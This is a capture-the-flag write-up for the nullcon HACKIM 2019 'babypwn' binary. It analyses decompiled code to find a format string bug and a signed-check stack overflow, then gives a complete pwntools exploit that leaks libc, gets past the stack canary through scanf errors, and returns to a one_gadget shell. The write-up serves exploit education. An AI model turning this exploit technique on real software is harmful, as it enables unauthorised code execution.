# nullcon HACKIM 2019 babypwn

# Info
```
[*] '/mnt/hgfs/Shared/babypwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# Analysis
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // rax
  char *v5; // rax
  char *v6; // rsi
  unsigned __int8 min_6A; // [rsp+6h] [rbp-6Ah]
  unsigned __int8 i; // [rsp+7h] [rbp-69h]
  char *format; // [rsp+8h] [rbp-68h]
  char min_60[80]; // [rsp+10h] [rbp-60h]
  char v11; // [rsp+60h] [rbp-10h]
  unsigned __int64 v12; // [rsp+68h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  min_6A = 0;
  puts("Create a tressure box?\r");
  _isoc99_scanf("%2s", &v11);
  if ( v11 == 'y' || v11 == 'Y' )
  {
    printf("name: ", &v11);
    v4 = (char *)malloc(0x64uLL);               // 100
    format = v4;
    // v4 = "Tressure Box: "
    *(_QWORD *)v4 = 'erusserT';
    *((_DWORD *)v4 + 2) = 'xoB ';
    *((_WORD *)v4 + 6) = ' :';
    v4[14] = 0;
    _isoc99_scanf("%50s", format + 14);
    v5 = &format[strlen(format)];
    // v4 = "Tressure Box: created!\r\n"
    *(_QWORD *)v5 = 'detaerc ';
    *((_DWORD *)v5 + 2) = '\n\r!';
    puts("How many coins do you have?\r");
    v6 = (char *)&min_6A;
    _isoc99_scanf("%hhu", &min_6A);
    if ( (char)min_6A > 20 )
    {
      perror("Coins that many are not supported :/\r\n");
      exit(1);
    }
    for ( i = 0; i < min_6A; ++i )
    {
      v6 = &min_60[4 * i];
      _isoc99_scanf("%d", v6);
    }
    printf(format, v6);
    free(format);
    result = 0;
  }
  else
  {
    puts("Bye!\r");
    result = 0;
  }
  return result;
}
```
Program allocates 0x64 bytes memory and takes user input in it.

then takes the number of coins and get another inputs.

The vulnerability is ```printf(format);```. It has format string vulnerability.

and There is another one. in ```scanf("%hhu", &min_6A)```, scanf gets input type of %hhu(unsigned 1 byte).

However, ```if ((char)min_6A > 20)``` examines that value in type char, which is signed.

If a number that is larger than 0x7F is given, it passes boundary test and we can overflow stack.

The point here is that the program uses **scanf** for input.

When given input doesn't match the type specified in scanf's first parameter, an error occurs and no input goes in.

Though the program has stack smashing protector, we can bypass this with the error of scanf.

```
Create a tressure box?
y
name: %p.%p
How many coins do you have?
1
1
Tressure Box: 0x1.0x7fb43ae66770 created!
```
With a few tests, able to get libc leak easily.

# Exploit
1. Libc leak using format string and go back to main
2. Stack overflow again and return to one_gadget
```
from pwn import *

binary = ELF('./babypwn')
libc = ELF('./libc.so.6')

main_addr = 0x400806
libc_offset = 0x3c6790
gadget_offset = 0xf1147 # 0x45216 0x4526a 0xf02a4 0xf1147

p = process('./babypwn', env = {'LD_PRELOAD' : './libc.so.6'})

# gdb.attach(p, 'b *0x4009a3');

# Stage1: Leak libc addr and return to main
p.sendline('y')
p.sendlineafter('name: ', '%p' * 25)
p.sendlineafter('have?', '128')

for i in range(22):
  p.sendline('1094795585') # AAAAAAAA

for i in range(4):
  p.sendline('-')

p.sendline(str(main_addr))
p.sendline('0')

for i in range(100):
  p.sendline('0')

p.recvuntil('Tressure Box: ')
libc_addr = int(p.recv().split('0x')[2], 16) - libc_offset
one_gadget_addr = libc_addr + gadget_offset
log.info('libc_addr: ' + hex(libc_addr))
log.info('gadget_addr: ' + hex(one_gadget_addr))


# Stage2: overwrite return address to one_gadget
p.sendline('y')
p.sendlineafter('name: ', '%p' * 25)
p.sendlineafter('have?', '128')

for i in range(22):
  p.sendline('1094795585') # AAAAAAAA

for i in range(4):
  p.sendline('-')

log.info(hex(one_gadget_addr & 0x00000000ffffffff))
log.info(hex((one_gadget_addr & 0xffffffff00000000) >> 32))
p.sendline(str(one_gadget_addr & 0x00000000ffffffff))
p.sendline(str((one_gadget_addr & 0xffffffff00000000) >> 32))


for i in range(100):
  p.sendline('0')

p.interactive();
```